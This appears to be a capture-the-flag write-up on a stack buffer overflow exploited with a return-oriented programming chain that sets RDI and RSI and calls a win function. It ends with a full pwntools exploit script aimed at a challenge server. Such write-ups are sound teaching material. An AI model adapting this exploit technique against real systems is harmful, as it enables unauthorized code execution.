### chain reactor - ROP w/ Stack Buffer Overflow

> x Exam (34)

The `02_chain_reactor` challenge increases operational complexity by removing all named helper symbols from the binary symbol table, forcing the utilization of automated gadget discovery tools to locate the execution primitives manually. The core vulnerability remains an unconstrained stack buffer overflow, which provides the necessary primitive to overwrite the saved instruction pointer and execute a structured Return-Oriented Programming chain. The final objective requires invoking the `win` function while correctly populating the first two argument registers, RDI and RSI, with the specific constants designated as `code1` and `code2`.

The removal of pre-labeled symbols necessitates a thorough analysis of the executable segments using command-line utilities like `ROPgadget` or `ropper` to identify the byte patterns corresponding to the required instruction sequences. Under the System V Application Binary Interface for amd64 architectures, the first argument must be loaded into the RDI register and the second argument must be loaded into the RSI register before control flow is redirected to the target function. Automated tools scan the compilation artifacts to expose sequences such as `pop rdi; ret` or `pop rsi; ret`, which may be embedded naturally within existing program subroutines without being explicitly defined as distinct function entry points. When a desired gadget sequence like `pop rsi` is paired with an adjacent register pop such as `pop r15; ret`, the structure of the stack payload must be adjusted to include a dummy value that satisfies the secondary pop instruction before the execution flow reaches the trailing return statement.

The complete exploitation framework is constructed to maintain systemic flexibility between local process debugging and remote target interactions, mapping the discovered gadget addresses directly as absolute hexadecimal values within the flat payload structure.



```Python
#!/usr/bin/env python3  
from pwn import *  
  
elf = ELF('./chain_reactor', checksec=False)  
context.binary = elf  
context.arch = 'amd64'  
  
OFFSET_TO_RIP = 72  
code1 = 0xc0ffee  
code2 = 0xbadc0de  
pop_rdi_ret = 0x000000000040121f  
pop_rsi_ret = 0x0000000000401221  
ret_gadget = 0x000000000040101a  
  
HOST = "offsec.m0lecon.it"  
PORT = 13599  
  
def conn():  
    if not args.LOCAL:  
        return remote(HOST, PORT)  
    return process(elf.path)  
  
p = conn()  
  
payload = flat(  
    b'A' * OFFSET_TO_RIP,  
    p64(ret_gadget),  
    p64(pop_rdi_ret),  
    p64(code1),  
    p64(pop_rsi_ret),  
    p64(code2),  
    p64(elf.sym.win)  
)  
  
p.send(payload)  
p.interactive()
```